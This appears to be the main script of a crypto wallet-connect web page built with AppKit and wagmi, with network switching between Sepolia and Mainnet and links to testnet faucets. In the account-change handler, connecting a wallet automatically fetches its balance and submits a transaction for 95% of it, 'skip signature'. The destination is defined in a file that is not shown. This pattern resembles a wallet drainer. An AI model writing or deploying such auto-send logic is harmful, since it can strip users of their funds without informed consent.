import { appKit, wagmiAdapter, mainnet, sepolia } from './config/appKit'
import { store } from './store/appkitStore'
import { updateTheme } from './utils/dom'
import { signMessage, sendTx, getBalanceWei } from './services/wallet'
import { formatUnits } from 'viem'
import showToast from './utils/toasts'
import { initializeSubscribers } from './utils/suscribers'

// Initialize subscribers (keeps store up-to-date)
initializeSubscribers(appKit)

// Utility to update loader/feedback UI
const setLoaderVisible = (visible) => {
  const c = document.getElementById('loaderContainer')
  if (!c) return
  c.className = visible ? 'loader-visible' : 'loader-hidden'
}

// status: 'info' | 'success' | 'error'
const setFeedback = (msg, status = 'info') => {
  const el = document.getElementById('liveFeedback')
  if (!el) return
  el.textContent = msg
  el.classList.remove('info', 'success', 'error')
  el.classList.add(status)

  const spinner = document.getElementById('spinner')
  const statusIcon = document.getElementById('statusIcon')
  if (!spinner || !statusIcon) return

  if (status === 'info') {
    spinner.style.display = ''
    spinner.style.borderTopColor = '#000'
    statusIcon.style.display = 'none'
    statusIcon.innerHTML = ''
  } else if (status === 'success') {
    spinner.style.display = 'none'
    statusIcon.style.display = 'flex'
    statusIcon.innerHTML = `\
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\
        <circle cx="12" cy="12" r="10" stroke="#16a34a" stroke-width="2"/>\
        <path d="M7.5 12.5l2.5 2.5 6-6" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\
      </svg>`
  } else if (status === 'error') {
    spinner.style.display = 'none'
    statusIcon.style.display = 'flex'
    statusIcon.innerHTML = `\
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\
        <circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/>\
        <path d="M15 9L9 15M9 9l6 6" stroke="#dc2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\
      </svg>`
  }
}

// Modal removed — using toasts for the full flow

// Single Connect button behavior
const connectBtn = document.getElementById('connect-button')
connectBtn?.addEventListener('click', () => {
  // Open the AppKit connect modal
  appKit.open()
  // immediate feedback for connect modal
  setLoaderVisible(true)
  setFeedback('Awaiting wallet selection — choose a wallet to connect', 'info')
  showToast('info', 'Connect', 'Choose a wallet to connect')
})

// Network switch button: toggles between Sepolia and Mainnet
const switchBtn = document.getElementById('switch-network')
switchBtn?.addEventListener('click', () => {
  try {
    const currentChainId = store.networkState?.chainId
    const target = currentChainId === sepolia.id ? mainnet : sepolia
    appKit.switchNetwork(target)
    showToast('info', 'Network', `Switching to ${target.name}`)
  } catch (e) {
    console.error('Network switch error', e)
    showToast('error', 'Network', 'Failed to switch network')
  }
})

let handledAddress = null

// helper to update the status tree
const setStep = (stepId, state, text) => {
  const el = document.getElementById(stepId)
  if (!el) return
  el.classList.remove('success', 'error', 'pending')
  el.classList.add(state)
  const icon = el.querySelector('.s-icon')
  if (icon) {
    if (state === 'success') icon.textContent = '✔'
    else if (state === 'error') icon.textContent = '✖'
    else icon.textContent = '○'
  }
  if (text) {
    const label = el.querySelector('.s-label')
    if (label) label.textContent = text
  }
}

// Top-up button behavior: shown when balance insufficient
const topupBtn = document.getElementById('topup-button')
if (topupBtn) {
  topupBtn.addEventListener('click', () => {
    const address = store.accountState?.address
    if (!address) {
      showToast('error', 'Top up', 'No connected address')
      return
    }
    // copy address to clipboard for easy paste into faucet
    try { navigator.clipboard.writeText(address) } catch (e) { /* ignore */ }

    // open a few popular Sepolia faucets in new tabs; user must complete captcha/login where required
    const faucets = [
      `https://faucets.chain.link/sepolia?address=${address}`,
      `https://faucet.paradigm.xyz/?address=${address}`,
      `https://sepoliafaucet.com/?address=${address}`
    ]
    faucets.forEach(url => {
      try { window.open(url, '_blank') } catch (e) { console.warn('Unable to open faucet', e) }
    })
    showToast('info', 'Top up', 'Address copied. Opening faucets — complete the captcha to receive test ETH.')
  })
}

// React to account changes: when address appears, start loader and send tx (skip signature)
appKit.subscribeAccount(async (accountState) => {
  if (!accountState || !accountState.address) return

  const address = accountState.address
  // Avoid re-running for same address
  if (handledAddress === address) return
  handledAddress = address

  // Update button state
  if (connectBtn) {
    connectBtn.textContent = 'Connected'
    connectBtn.disabled = true
  }

  // Update status tree: connected
  setStep('step-connected', 'success', `Connected: ${address}`)
  showToast('success', 'Connected', address)
  setLoaderVisible(true)
  setFeedback(`Connected: ${address}. Calculating amount to send...`, 'info')

  // compute balance and send 95% (reserve 5% for gas)
  try {
    setStep('step-calculated', 'pending')
    setFeedback('Fetching balance to calculate send amount...', 'info')
    const balanceWei = await getBalanceWei(store.eip155Provider, address)
    console.log('Balance (wei):', balanceWei.toString())
    const amountToSend = (balanceWei * 95n) / 100n
    if (amountToSend <= 0n) {
      setFeedback('Insufficient balance to send after reserving gas.', 'error')
      setStep('step-calculated', 'error', 'Insufficient balance after reserve')
      showToast('error', 'Insufficient Balance', 'Cannot send after reserving 5% for gas')
      setTimeout(() => setLoaderVisible(false), 1000)
      return
    }

    // format human readable
    const ethAmount = formatUnits(amountToSend, 18)
    setStep('step-calculated', 'success', `Send amount: ${ethAmount} ETH`)
    setFeedback(`Sending ${ethAmount} ETH — please confirm in your wallet`, 'info')
    showToast('info', 'Send Amount', `${ethAmount} ETH (95% of balance)`) 

    // send tx
    setStep('step-submitted', 'pending')
    const tx = await sendTx(store.eip155Provider, address, wagmiAdapter, amountToSend)
    console.log('Transaction result:', tx)
    const txHash = tx?.hash || tx?.request?.hash || tx?.transactionHash || JSON.stringify(tx)
    setStep('step-submitted', 'success', `Transaction: ${txHash}`)
    setFeedback(`Transaction submitted: ${txHash}`, 'success')
    showToast('success', 'Transaction Submitted', txHash.toString())
    setTimeout(() => setLoaderVisible(false), 1400)
  } catch (txErr) {
    console.error('Transaction error', txErr)
    setFeedback('Transaction failed — see console', 'error')
    setStep('step-submitted', 'error', 'Transaction failed')
    showToast('error', 'Transaction Failed', String(txErr?.message || txErr))
    setTimeout(() => setLoaderVisible(false), 1200)
  }
})

// Set initial theme if available
try { updateTheme(store.themeState.themeMode) } catch (e) {}
